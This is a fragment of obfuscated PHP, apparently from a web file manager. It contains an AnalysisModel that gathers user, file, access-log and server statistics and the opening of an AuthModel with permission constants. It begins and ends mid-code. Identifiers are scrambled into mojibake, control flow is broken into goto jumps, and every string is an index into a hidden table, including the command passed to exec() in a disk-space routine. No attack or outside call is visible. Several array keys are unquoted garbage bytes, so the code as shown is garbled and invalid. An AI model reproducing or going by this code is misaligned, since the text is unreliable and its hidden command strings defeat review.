goto dÍâÕ¢¦Šë; e©Ãİãù„Û: } public function uqgl2bacf090($DÌäÌó¬ ë, $A •©ŞÃÀò) { $fä•‘Ä„šƒ =& $_SERVER[˜]; return $fä•‘Ä„šƒ[13](array($fä•‘Ä„šƒ[14], $fä•‘Ä„šƒ[360]), $DÌäÌó¬ ë, $A •©ŞÃÀò); } public function kvfd4343c7ed($AÓ‘«ÂÃ‚„, $F‰—óÜë›) { $EŞ­Š¹ÈåÇ =& $_SERVER[˜]; return $EŞ­Š¹ÈåÇ[13](array($EŞ­Š¹ÈåÇ[361], $EŞ­Š¹ÈåÇ[362]), $AÓ‘«ÂÃ‚„, $F‰—óÜë›); $B°œç’Œ¡‰ = $_SERVER[¬ˆÚÂ”Éğä][694]; } public function ehlf4e1028be($B©Ğİ·ôï, $FˆË’Ş£µÍ) { $bÖ‰‰ïóô‰ =& $_SERVER[˜]; return $bÖ‰‰ïóô‰[13](array($bÖ‰‰ïóô‰[361], $bÖ‰‰ïóô‰[363]), $B©Ğİ·ôï, $FˆË’Ş£µÍ); } } goto a¾ÕËÚó‰Ò; d½ªçÁŒÌ×: class AnalysisModel extends ModelBaseLight { public function init($BÍè±§ºØ‘) { $Aö·áêóøô =& $_SERVER[¬ˆÚÂ”Éğä]; $fªï‚ÌàÄŠ = array($Aö·áêóøô[537] => array($Aö·áêóøô[29] => $Aö·áêóøô[2046], $Aö·áêóøô[261] => array($Aö·áêóøô[210], $Aö·áêóøô[708], $Aö·áêóøô[2047], $Aö·áêóøô[2048])), $Aö·áêóøô[2049] => array($Aö·áêóøô[29] => $Aö·áêóøô[2050], $Aö·áêóøô[261] => array($Aö·áêóøô[210], $Aö·áêóøô[706], $Aö·áêóøô[2051], $Aö·áêóøô[2052], $Aö·áêóøô[2053]))); if (!isset($fªï‚ÌàÄŠ[$BÍè±§ºØ‘])) { return !1; } $this->optionType = $fªï‚ÌàÄŠ[$BÍè±§ºØ‘][$Aö·áêóøô[29]]; $this->field = $fªï‚ÌàÄŠ[$BÍè±§ºØ‘][$Aö·áêóøô[261]]; return !0; } public function listData($FªØ…®±³„ = false, $DœÑ£Œ›‡ = "\x6d\x6f\144\151\146\x79\124\x69\x6d\x65", $d¤ôá”Ú ³ = false) { return parent::listData($FªØ…®±³„, $DœÑ£Œ›‡, $d¤ôá”Ú ³); } public function trendList($F³¡ÈÓóö‰) { goto Dê¨ğÀêÒ; fÚ©ÔÑ°¹â: foreach ($D©ÌÔ‘ŠÜ as $FÏ°ÅÌÉ‡) { $this->{$DáÅ©´Ùšˆ}($FÏ°ÅÌÉ‡); } return $this->listData(); goto D³óÚòÚÒ; EË‡ÕöŠ: if (!isset($dÊ‰ÈŸ¯†¢)) { $B˜µí‰õ = $F³¡ÈÓóö‰ == $cöµõ›ï­Ş[537] ? $cöµõ›ï­Ş[479] : $cöµõ›ï­Ş[760]; $dÊ‰ÈŸ¯†¢ = Model($B˜µí‰õ)->min($cöµõ›ï­Ş[187]); } $DáÅ©´Ùšˆ = $cöµõ›ï­Ş[2056] . ucfirst($F³¡ÈÓóö‰); $D©ÌÔ‘ŠÜ = $this->dateList($dÊ‰ÈŸ¯†¢); goto fÚ©ÔÑ°¹â; Dê¨ğÀêÒ: $cöµõ›ï­Ş =& $_SERVER[¬ˆÚÂ”Éğä]; $Bõµ‚‹‰¯Ã = $this->listData(); if ($Bõµ‚‹‰¯Ã) { $e”±¤ÛÜÒÃ = end($Bõµ‚‹‰¯Ã); $FÏ°ÅÌÉ‡ = date($cöµõ›ï­Ş[2054], strtotime($cöµõ›ï­Ş[2055])); if ($e”±¤ÛÜÒÃ[$cöµõ›ï­Ş[210]] == $FÏ°ÅÌÉ‡) { return $Bõµ‚‹‰¯Ã; } $dÊ‰ÈŸ¯†¢ = strtotime($e”±¤ÛÜÒÃ[$cöµõ›ï­Ş[210]]); } goto EË‡ÕöŠ; D³óÚòÚÒ: } private function dateList($Eö¥õš¯ØÌ) { $DˆìƒÓñØ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÔÜ¡¯¨ = $Eö¥õš¯ØÌ; $BÓ®¹”óã = strtotime($DˆìƒÓñØ[2055]); $FìÙÃÔ«ÜÈ = array(); while ($EÔÜ¡¯¨ <= $BÓ®¹”óã) { $FìÙÃÔ«ÜÈ[] = date($DˆìƒÓñØ[2054], $EÔÜ¡¯¨); $EÔÜ¡¯¨ = strtotime($DˆìƒÓñØ[2057], $EÔÜ¡¯¨); } return $FìÙÃÔ«ÜÈ; } public function _recordUser($A„«¾£»Ï¬ = '') { goto a–ˆÔè†•ê; eÓÇ÷§¶¾Œ: $d½‹İõ¿ĞŞ = Model($c‘íµÜ£ †[479])->where($CÍàäªš˜³)->count($c‘íµÜ£ †[1450]); $CÍàäªš˜³[$c‘íµÜ£ †[29]] = $c‘íµÜ£ †[2060]; $D“‡…ô…Ğ‰ = Model($c‘íµÜ£ †[2061])->where($CÍàäªš˜³)->count($c‘íµÜ£ †[2062]); goto CÛ¿›ïÀ˜†; F„ãµãÁôœ: $CÍàäªš˜³ = array($c‘íµÜ£ †[187] => array($c‘íµÜ£ †[939], $DÅ¾¦»·æ)); $EÑ‹ãÔ¨Ä‚ = Model($c‘íµÜ£ †[479])->where($CÍàäªš˜³)->count($c‘íµÜ£ †[1450]); $CÍàäªš˜³[$c‘íµÜ£ †[187]] = array($c‘íµÜ£ †[321], array($aªâ„ëõ†, $DÅ¾¦»·æ)); goto eÓÇ÷§¶¾Œ; CÛ¿›ïÀ˜†: $A‚¨¡ŠäÙ = array($c‘íµÜ£ †[210] => $A„«¾£»Ï¬, $c‘íµÜ£ †[708] => (int) $EÑ‹ãÔ¨Ä‚, $c‘íµÜ£ †[2047] => (int) $d½‹İõ¿ĞŞ, $c‘íµÜ£ †[2048] => (int) $D“‡…ô…Ğ‰); return $this->insert($A‚¨¡ŠäÙ); goto E¾î™Š§·; a–ˆÔè†•ê: $c‘íµÜ£ † =& $_SERVER[¬ˆÚÂ”Éğä]; $aªâ„ëõ† = strtotime(date($c‘íµÜ£ †[2058], strtotime($A„«¾£»Ï¬))); $DÅ¾¦»·æ = strtotime(date($c‘íµÜ£ †[2059], strtotime($A„«¾£»Ï¬))); goto F„ãµãÁôœ; E¾î™Š§·: } public function _recordStore($E¸»ÕË©ŒØ = '') { goto cªí³»»ø; cïÊ–‡ö×Î: $Fõ¬ãô„ÓŞ = Model($Déá®¬Õ›·[760])->where($bŞ¯›Î‡ßº)->sum($Déá®¬Õ›·[77]); $Bà Š…Ï©ã = array($Déá®¬Õ›·[210] => $E¸»ÕË©ŒØ, $Déá®¬Õ›·[706] => (int) $a¼«í·ëù¦, $Déá®¬Õ›·[2051] => (int) $d›÷¥¦«ˆ, $Déá®¬Õ›·[2052] => (int) $DƒæÛëøªè, $Déá®¬Õ›·[2053] => (int) $Fõ¬ãô„ÓŞ); return $this->insert($Bà Š…Ï©ã); goto f¯øãË”½™; cªí³»»ø: $Déá®¬Õ›· =& $_SERVER[¬ˆÚÂ”Éğä]; $bŞí‘İ•…â = strtotime(date($Déá®¬Õ›·[2059], strtotime($E¸»ÕË©ŒØ))); $bŞ¯›Î‡ßº = array($Déá®¬Õ›·[187] => array($Déá®¬Õ›·[939], $bŞí‘İ•…â)); goto F’×î¯˜ßÉ; Eà•‘¬æ…: $bŞ¯›Î‡ßº[$Déá®¬Õ›·[371]] = 1; $DƒæÛëøªè = Model($Déá®¬Õ›·[760])->where($bŞ¯›Î‡ßº)->sum($Déá®¬Õ›·[77]); $bŞ¯›Î‡ßº[$Déá®¬Õ›·[371]] = 2; goto cïÊ–‡ö×Î; F’×î¯˜ßÉ: $d›÷¥¦«ˆ = Model($Déá®¬Õ›·[422])->where($bŞ¯›Î‡ßº)->sum($Déá®¬Õ›·[77]); $bŞ¯›Î‡ßº[$Déá®¬Õ›·[370]] = 0; $a¼«í·ëù¦ = Model($Déá®¬Õ›·[760])->where($bŞ¯›Î‡ßº)->sum($Déá®¬Õ›·[77]); goto Eà•‘¬æ…; f¯øãË”½™: } public function trend($BÕ¬Çô’î¹, $FìêÅó–áŞ) { goto B¾Ì„âŒ¼; BÀÙç‚…‰…: if (empty($eÎ‚¶øÖÈê)) { $EŸ‚¿†† = date($cºø•ƒ¾šœ[2054], strtotime($cºø•ƒ¾šœ[2055])); $B”Ü§ˆ–ĞÜ = array($cºø•ƒ¾šœ[210] => $EŸ‚¿††); foreach ($e‡øŠŠ[$BÕ¬Çô’î¹] as $b¹ªÚêË¢ => $B’¨öèîË) { $B”Ü§ˆ–ĞÜ[$b¹ªÚêË¢] = 0; } $eÎ‚¶øÖÈê[] = $B”Ü§ˆ–ĞÜ; } $A’èâÂ§æó = array(); foreach ($eÎ‚¶øÖÈê as $B’¨öèîË) { if ($BÕ¬Çô’î¹ == $cºø•ƒ¾šœ[2049] && $B’¨öèîË[$cºø•ƒ¾šœ[2051]] > $B’¨öèîË[$cºø•ƒ¾šœ[706]]) { $B’¨öèîË[$cºø•ƒ¾šœ[2051]] = $B’¨öèîË[$cºø•ƒ¾šœ[706]]; } foreach ($e‡øŠŠ[$BÕ¬Çô’î¹] as $b¹ªÚêË¢ => $Eå’ÀÙ òÀ) { $Bè´¹¯¤Ø× = array($cºø•ƒ¾šœ[210] => $B’¨öèîË[$cºø•ƒ¾šœ[210]], $cºø•ƒ¾šœ[1356] => $Eå’ÀÙ òÀ); $Bè´¹¯¤Ø×[$bÇÛÛ•”¤Š[$BÕ¬Çô’î¹]] = isset($B’¨öèîË[$b¹ªÚêË¢]) ? $B’¨öèîË[$b¹ªÚêË¢] : 0; $A’èâÂ§æó[] = $Bè´¹¯¤Ø×; } } goto CŠè°˜±ªİ; CŠè°˜±ªİ: return $A’èâÂ§æó; goto aéë™êæé‡; CÇÈğ›š‚µ: if ($eÎ‚¶øÖÈê && $FìêÅó–áŞ != $cºø•ƒ¾šœ[1425]) { $FŞö¤¡ò¹ = $eÎ‚¶øÖÈê[0][$cºø•ƒ¾šœ[210]]; $eªßÏ‘Ÿ™È = $this->validDate($FìêÅó–áŞ, $FŞö¤¡ò¹); $e†á‡òš§– = array(); $C•‹Â¦…¸õ = array_to_keyvalue($eÎ‚¶øÖÈê, $cºø•ƒ¾šœ[210]); foreach ($eªßÏ‘Ÿ™È as $EŸ‚¿††) { if (isset($C•‹Â¦…¸õ[$EŸ‚¿††])) { $Bè´¹¯¤Ø× = $C•‹Â¦…¸õ[$EŸ‚¿††]; } else { $Bè´¹¯¤Ø× = end($eÎ‚¶øÖÈê); $Bè´¹¯¤Ø×[$cºø•ƒ¾šœ[210]] = $EŸ‚¿††; if ($BÕ¬Çô’î¹ == $cºø•ƒ¾šœ[537]) { $Bè´¹¯¤Ø×[$cºø•ƒ¾šœ[2047]] = $Bè´¹¯¤Ø×[$cºø•ƒ¾šœ[2048]] = 0; } } $e†á‡òš§–[] = $Bè´¹¯¤Ø×; } $eÎ‚¶øÖÈê = $e†á‡òš§–; } $e‡øŠŠ = array($cºø•ƒ¾šœ[537] => array($cºø•ƒ¾šœ[708] => LNG($cºø•ƒ¾šœ[2063]), $cºø•ƒ¾šœ[2047] => LNG($cºø•ƒ¾šœ[2064]), $cºø•ƒ¾šœ[2048] => LNG($cºø•ƒ¾šœ[2065])), $cºø•ƒ¾šœ[2049] => array($cºø•ƒ¾šœ[706] => LNG($cºø•ƒ¾šœ[2066]), $cºø•ƒ¾šœ[2051] => LNG($cºø•ƒ¾šœ[2067]), $cºø•ƒ¾šœ[2052] => LNG($cºø•ƒ¾šœ[2068]), $cºø•ƒ¾šœ[2053] => LNG($cºø•ƒ¾šœ[2069]))); $bÇÛÛ•”¤Š = array($cºø•ƒ¾šœ[537] => $cºø•ƒ¾šœ[2070], $cºø•ƒ¾šœ[2049] => $cºø•ƒ¾šœ[77]); goto BÀÙç‚…‰…; B¾Ì„âŒ¼: $cºø•ƒ¾šœ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->init($BÕ¬Çô’î¹)) { return !1; } $eÎ‚¶øÖÈê = $this->trendList($BÕ¬Çô’î¹); goto CÇÈğ›š‚µ; aéë™êæé‡: } public function validDate($d—Ä†Šº§Ñ, $DÕ‡İíàÃ¾) { goto Dßˆ°ëìà; EÔÒäáªìŠ: switch ($d—Ä†Šº§Ñ) { case $Cİˆå«‡ ’[1432]: $d¸ÃïÎ¥î× = mktime(0, 0, 0, date($Cİˆå«‡ ’[2071]), date($Cİˆå«‡ ’[2072]) - date($Cİˆå«‡ ’[1239]) + 7 - 7, date($Cİˆå«‡ ’[2073])); $E°ìÅÜ§­ß = 0; do { $a“›ÓˆÅ© = date($Cİˆå«‡ ’[2054], $d¸ÃïÎ¥î× - 3600 * 24 * 7 * $E°ìÅÜ§­ß); $f°óâÕß×ì[] = $a“›ÓˆÅ©; $E°ìÅÜ§­ß++; } while ($DÕ‡İíàÃ¾ < $a“›ÓˆÅ©); break; case $Cİˆå«‡ ’[1430]: $E°ìÅÜ§­ß = 1; do { $bÙà™Ùğß = date($Cİˆå«‡ ’[2074], strtotime("\55\40{$E°ìÅÜ§­ß}\x20\x6d\x6f\156\164\x68\163")); $f°óâÕß×ì[] = $bÙà™Ùğß; $E°ìÅÜ§­ß++; } while ($DÕ‡İíàÃ¾ < $bÙà™Ùğß); break; case $Cİˆå«‡ ’[1739]: $f˜–äíñ = (int) date($Cİˆå«‡ ’[2073], strtotime($DÕ‡İíàÃ¾)); $F½óÕ‰öË‘ = (int) date($Cİˆå«‡ ’[2073]); if ($f˜–äíñ >= $F½óÕ‰öË‘) { break; } for ($f˜–äíñ; $f˜–äíñ < $F½óÕ‰öË‘; $f˜–äíñ++) { $f°óâÕß×ì[] = $f˜–äíñ . $Cİˆå«‡ ’[2075]; } break; default: break; } if ($DÕ‡İíàÃ¾ > end($f°óâÕß×ì)) { array_pop($f°óâÕß×ì); } sort($f°óâÕß×ì); goto BÌ¯¦±†Ãí; Dßˆ°ëìà: $Cİˆå«‡ ’ =& $_SERVER[¬ˆÚÂ”Éğä]; $dˆÙ­´äé = date($Cİˆå«‡ ’[2054], strtotime($Cİˆå«‡ ’[2055])); $f°óâÕß×ì = array($dˆÙ­´äé); goto EÔÒäáªìŠ; BÌ¯¦±†Ãí: return $f°óâÕß×ì; goto DÀíí¦‰¤¿; DÀíí¦‰¤¿: } public function listTable($c®ùÕÙ±È¬) { $Eéá…ñÓ‘ = ucfirst($c®ùÕÙ±È¬); return Model($Eéá…ñÓ‘)->listData(); } public function option($aëî¼õââ³) { $dÓ¼™åñÈ = $_SERVER[¬ˆÚÂ”Éğä][2076] . ucfirst($aëî¼õââ³); return $this->{$dÓ¼™åñÈ}(); } private function optionUser() { goto F¸Æ®Ñ±ïÃ; F¸Æ®Ñ±ïÃ: $Cù³º ÓÈ =& $_SERVER[¬ˆÚÂ”Éğä]; $bí°†±Ø‘› = Model($Cù³º ÓÈ[479])->count($Cù³º ÓÈ[1450]); $bÑ„ñÙœˆ» = Model($Cù³º ÓÈ[479])->where($Cù³º ÓÈ[2077])->count($Cù³º ÓÈ[1450]); goto F‘½ïÃˆ‰¹; F‘½ïÃˆ‰¹: $A¯¢²ô±¦Ú = strtotime($Cù³º ÓÈ[2078]); $EÉ˜Ì¼¹Ñ = array($Cù³º ÓÈ[2079] => array($Cù³º ÓÈ[940], $A¯¢²ô±¦Ú)); $CÏáğ¢•ÛÚ = (int) Model($Cù³º ÓÈ[479])->where($EÉ˜Ì¼¹Ñ)->count($Cù³º ÓÈ[1450]); goto aŒ­ˆõõ¹; aŒ­ˆõõ¹: if (!$CÏáğ¢•ÛÚ) { $CÏáğ¢•ÛÚ = 1; } $A¯¢²ô±¦Ú = strtotime(date($Cù³º ÓÈ[2058])); $EÉ˜Ì¼¹Ñ = array($Cù³º ÓÈ[2079] => array($Cù³º ÓÈ[940], $A¯¢²ô±¦Ú)); goto aİÅùªÄØ¹; aİÅùªÄØ¹: $b½ÌîÒš…¶ = Model($Cù³º ÓÈ[479])->where($EÉ˜Ì¼¹Ñ)->count($Cù³º ÓÈ[1450]); return array($Cù³º ÓÈ[703] => (int) $bí°†±Ø‘›, $Cù³º ÓÈ[2080] => (int) ($bí°†±Ø‘› - $bÑ„ñÙœˆ»), $Cù³º ÓÈ[2081] => (int) $bÑ„ñÙœˆ», $Cù³º ÓÈ[2082] => (int) $b½ÌîÒš…¶, $Cù³º ÓÈ[2083] => $CÏáğ¢•ÛÚ); goto bÒ™‚¾Äæ×; bÒ™‚¾Äæ×: } private function optionFile() { goto fÈšÚ¡§ïñ; E…éÌÀƒÜ: $f­¹ğÚ¡ø„ = Model($DÇïßˆºÓ–[760])->where($eƒµÌĞÛõ)->sum($DÇïßˆºÓ–[77]); $a‹À‹„Ì„¹ = Model($DÇïßˆºÓ–[760])->where($eƒµÌĞÛõ)->count($DÇïßˆºÓ–[369]); return array($DÇïßˆºÓ–[706] => $dŒøÎ‹Â¨, $DÇïßˆºÓ–[2051] => $f°˜åÎÇ©, $DÇïßˆºÓ–[2084] => $dŒøÎ‹Â¨ - $f°˜åÎÇ©, $DÇïßˆºÓ–[2085] => (int) $f­¹ğÚ¡ø„, $DÇïßˆºÓ–[708] => (int) $C‚‰ÔË´ê—, $DÇïßˆºÓ–[2086] => (int) $a‹À‹„Ì„¹); goto DåÜ¶î–Ğ¶; FÂª¯öå“å: $f°˜åÎÇ© = $CÇ³ÆŒ°ºÍ[$DÇïßˆºÓ–[2051]]; $C‚‰ÔË´ê— = Model($DÇïßˆºÓ–[760])->where(array($DÇïßˆºÓ–[370] => 0))->count($DÇïßˆºÓ–[369]); $eƒµÌĞÛõ = array($DÇïßˆºÓ–[370] => 0, $DÇïßˆºÓ–[187] => array($DÇïßˆºÓ–[940], strtotime(date($DÇïßˆºÓ–[2058])))); goto E…éÌÀƒÜ; fÈšÚ¡§ïñ: $DÇïßˆºÓ– =& $_SERVER[¬ˆÚÂ”Éğä]; $CÇ³ÆŒ°ºÍ = $this->sourceSize(); $dŒøÎ‹Â¨ = $CÇ³ÆŒ°ºÍ[$DÇïßˆºÓ–[77]]; goto FÂª¯öå“å; DåÜ¶î–Ğ¶: } private function optionAccess() { $Fî°ƒ›È« =& $_SERVER[¬ˆÚÂ”Éğä]; return array($Fî°ƒ›È«[703] => $this->typeLogCnt(), $Fî°ƒ›È«[103] => $this->typeLogCnt($Fî°ƒ›È«[103]), $Fî°ƒ›È«[404] => $this->typeLogCnt($Fî°ƒ›È«[404]), $Fî°ƒ›È«[2087] => $this->typeLogCnt($Fî°ƒ›È«[2087]), $Fî°ƒ›È«[2088] => $this->typeLogCnt($Fî°ƒ›È«[2088]), $Fî°ƒ›È«[537] => $this->typeLogCnt($Fî°ƒ›È«[33], $Fî°ƒ›È«[2062])); } private function typeLogCnt($dÒ°ñ¨›ˆò = '', $C¤³ƒ¬ñÖ½ = "\151\144") { goto d‚º–øŸæ ; Cî÷˜‡ø: $E»ôÕĞÕ¹ = array($AÔÙÚŒè—[187] => array($AÔÙÚŒè—[940], $Bİ–ºØ¥)); if ($dÒ°ñ¨›ˆò) { $E»ôÕĞÕ¹[$AÔÙÚŒè—[29]] = array($AÔÙÚŒè—[7], $CƒËŒ÷«Œâ[$dÒ°ñ¨›ˆò]); } $AŒèÚ‹ƒ› = Model($AÔÙÚŒè—[2061])->where($E»ôÕĞÕ¹)->count($C¤³ƒ¬ñÖ½); goto fääÈ£­¹¤; fääÈ£­¹¤: return (int) $AŒèÚ‹ƒ›; goto c›æòÆ¦ƒ; d‚º–øŸæ : $AÔÙÚŒè— =& $_SERVER[¬ˆÚÂ”Éğä]; $CƒËŒ÷«Œâ = array($AÔÙÚŒè—[103] => array($AÔÙÚŒè—[2089], $AÔÙÚŒè—[2090]), $AÔÙÚŒè—[404] => array($AÔÙÚŒè—[2091], $AÔÙÚŒè—[2092]), $AÔÙÚŒè—[2087] => array($AÔÙÚŒè—[2093], $AÔÙÚŒè—[2094], $AÔÙÚŒè—[2095]), $AÔÙÚŒè—[2088] => array($AÔÙÚŒè—[2096], $AÔÙÚŒè—[2097]), $AÔÙÚŒè—[2098] => array($AÔÙÚŒè—[2099], $AÔÙÚŒè—[2100], $AÔÙÚŒè—[2101])); $Bİ–ºØ¥ = strtotime(date($AÔÙÚŒè—[2058])); goto Cî÷˜‡ø; c›æòÆ¦ƒ: } private function optionServer() { goto A„Öˆ©³âƒ; C£‚ÍÒ·ğ·: if ($c®ïêêàññ == $fø‡¦ÅƒäÚ[731]) { $a–ö«ƒšÄ = explode($fø‡¦ÅƒäÚ[1089], $Bòİøî„¾Ì[$fø‡¦ÅƒäÚ[899]]); $c®ïêêàññ = $a–ö«ƒšÄ[0]; } if ($c®ïêêàññ == $fø‡¦ÅƒäÚ[734] || $c®ïêêàññ == $fø‡¦ÅƒäÚ[735]) { $A´ëŠºãÍ = Model()->db()->query($fø‡¦ÅƒäÚ[2102]); $BëÔ†¶æ¡ = $A´ëŠºãÍ[0] && isset($A´ëŠºãÍ[0][$fø‡¦ÅƒäÚ[1355]]) ? $A´ëŠºãÍ[0][$fø‡¦ÅƒäÚ[1355]] : 0; $c®ïêêàññ = $fø‡¦ÅƒäÚ[2103] . ($BëÔ†¶æ¡ ? $fø‡¦ÅƒäÚ[8] . $BëÔ†¶æ¡ : $fø‡¦ÅƒäÚ[33]); } $b×ƒ•©”Ì = $GLOBALS[$fø‡¦ÅƒäÚ[6]][$fø‡¦ÅƒäÚ[337]][$fø‡¦ÅƒäÚ[762]]; goto Cæ„óó¿; A„Öˆ©³âƒ: $fø‡¦ÅƒäÚ =& $_SERVER[¬ˆÚÂ”Éğä]; $A†ÎÖˆ¦¾ = $this->diskDriver(); $EÊ…°ÇŒ ç = KodIO::defaultDriver(); goto F÷ö„¹†ƒ; Cæ„óó¿: return array($fø‡¦ÅƒäÚ[2104] => $A†ÎÖˆ¦¾ ? $A†ÎÖˆ¦¾[$fø‡¦ÅƒäÚ[2105]] : 0, $fø‡¦ÅƒäÚ[2106] => $A†ÎÖˆ¦¾ ? $A†ÎÖˆ¦¾[$fø‡¦ÅƒäÚ[2107]] : 0, $fø‡¦ÅƒäÚ[2108] => (int) $EÊ…°ÇŒ ç[$fø‡¦ÅƒäÚ[2105]] * 1024 * 1024 * 1024, $fø‡¦ÅƒäÚ[2109] => (int) $fØã´ö¼Íğ, $fø‡¦ÅƒäÚ[2110] => ucfirst($F‚˜–‘Èãø), $fø‡¦ÅƒäÚ[2111] => $fø‡¦ÅƒäÚ[2112] . PHP_VERSION, $fø‡¦ÅƒäÚ[2113] => phpBuild64() ? 64 : 32, $fø‡¦ÅƒäÚ[702] => str_replace($fø‡¦ÅƒäÚ[2114], $fø‡¦ÅƒäÚ[916], $c®ïêêàññ), $fø‡¦ÅƒäÚ[337] => ucfirst($b×ƒ•©”Ì), $fø‡¦ÅƒäÚ[28] => $_SERVER[$fø‡¦ÅƒäÚ[2115]]); goto b‹¨†ºœô¡; f‚ù¾Û„ù: $F‚˜–‘Èãø = $B¬È‡ß×¡‹[0]; $Bòİøî„¾Ì = $GLOBALS[$fø‡¦ÅƒäÚ[6]][$fø‡¦ÅƒäÚ[17]]; $c®ïêêàññ = $Bòİøî„¾Ì[$fø‡¦ÅƒäÚ[900]]; goto C£‚ÍÒ·ğ·; F÷ö„¹†ƒ: $dŠ‚«Ä = array($fø‡¦ÅƒäÚ[751] => $EÊ…°ÇŒ ç[$fø‡¦ÅƒäÚ[367]]); $fØã´ö¼Íğ = Model($fø‡¦ÅƒäÚ[422])->where($dŠ‚«Ä)->sum($fø‡¦ÅƒäÚ[77]); $B¬È‡ß×¡‹ = explode($fø‡¦ÅƒäÚ[50], $_SERVER[$fø‡¦ÅƒäÚ[139]]); goto f‚ù¾Û„ù; b‹¨†ºœô¡: } private function diskDriver() { goto f©¦‰„ØÈá; B–³ÜÙÅ°: $cÔ†ã±„¢ = $cÄ‹ÆìšŠ - @disk_free_space($eµù–”âËğ); return array($eÏ¥Ç£İ×[2105] => $cÄ‹ÆìšŠ, $eÏ¥Ç£İ×[2107] => $cÔ†ã±„¢); goto eÈØÁí¾; f©¦‰„ØÈá: $eÏ¥Ç£İ× =& $_SERVER[¬ˆÚÂ”Éğä]; $eµù–”âËğ = $eÏ¥Ç£İ×[8]; $DŞŒ²¤Û‘ä = $GLOBALS[$eÏ¥Ç£İ×[6]][$eÏ¥Ç£İ×[2116]] == $eÏ¥Ç£İ×[2117]; goto DÒ²ÂÂéßç; DÒ²ÂÂéßç: if ($DŞŒ²¤Û‘ä) { $eµù–”âËğ = $eÏ¥Ç£İ×[2118]; if (function_exists($eÏ¥Ç£İ×[2119])) { exec($eÏ¥Ç£İ×[2120], $C®ô×µ¥Ù•); $eµù–”âËğ = $C®ô×µ¥Ù•[1] . $eÏ¥Ç£İ×[8]; } } if (!file_exists($eµù–”âËğ)) { return; } $cÄ‹ÆìšŠ = @disk_total_space($eµù–”âËğ); goto B–³ÜÙÅ°; eÈØÁí¾: } public function fileChart($aÃÖÂèæó) { goto dÖâ¼ïß¯Ú; dÖâ¼ïß¯Ú: $DµÓù®ÏŸñ =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($aÃÖÂèæó[$DµÓù®ÏŸñ[1450]])) { return Model($DµÓù®ÏŸñ[760])->userFileTypeProfile($aÃÖÂèæó[$DµÓù®ÏŸñ[1450]]); } if (isset($aÃÖÂèæó[$DµÓù®ÏŸñ[2121]])) { return Model($DµÓù®ÏŸñ[760])->groupFileTypeProfile($aÃÖÂèæó[$DµÓù®ÏŸñ[2121]]); } goto B¨îä‘É¡; B¨îä‘É¡: $aŠÌàô¸ = $this->sourceSize(); $B¥¶ £“ = array($DµÓù®ÏŸñ[463] => 0, $DµÓù®ÏŸñ[371] => 1); $Fø¾ÁÂˆã” = Model($DµÓù®ÏŸñ[760])->where($B¥¶ £“)->sum($DµÓù®ÏŸñ[77]); goto CÊ§ ëÔˆ; CÊ§ ëÔˆ: $B¥¶ £“[$DµÓù®ÏŸñ[371]] = 2; $eÛØ‚¡’­‘ = Model($DµÓù®ÏŸñ[760])->where($B¥¶ £“)->sum($DµÓù®ÏŸñ[77]); return array($DµÓù®ÏŸñ[706] => $aŠÌàô¸[$DµÓù®ÏŸñ[77]], $DµÓù®ÏŸñ[2051] => $aŠÌàô¸[$DµÓù®ÏŸñ[2051]], $DµÓù®ÏŸñ[2052] => (int) $Fø¾ÁÂˆã”, $DµÓù®ÏŸñ[2053] => (int) $eÛØ‚¡’­‘); goto fÂ³óÃïË; fÂ³óÃïË: } private function sourceSize() { $aÙ‘àÃ’ê¾ =& $_SERVER[¬ˆÚÂ”Éğä]; $eÖÚ—Ì¦Í = Model($aÙ‘àÃ’ê¾[760])->where(array($aÙ‘àÃ’ê¾[370] => 0))->sum($aÙ‘àÃ’ê¾[77]); $CÌÓĞÈÚ‘ = Model($aÙ‘àÃ’ê¾[422])->sum($aÙ‘àÃ’ê¾[77]); if ($CÌÓĞÈÚ‘ > $eÖÚ—Ì¦Í) { $CÌÓĞÈÚ‘ = $eÖÚ—Ì¦Í; } return array($aÙ‘àÃ’ê¾[77] => (int) $eÖÚ—Ì¦Í, $aÙ‘àÃ’ê¾[2051] => (int) $CÌÓĞÈÚ‘); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Eï‹ƒ«ŞÛØ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÑ£Ú•‹× = array(array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2122]), $Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2124], $Eï‹ƒ«ŞÛØ[2125] => 6, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2128]), $Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2129], $Eï‹ƒ«ŞÛØ[2125] => 1, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2130]), $Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2131], $Eï‹ƒ«ŞÛØ[2125] => 2, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2132]), 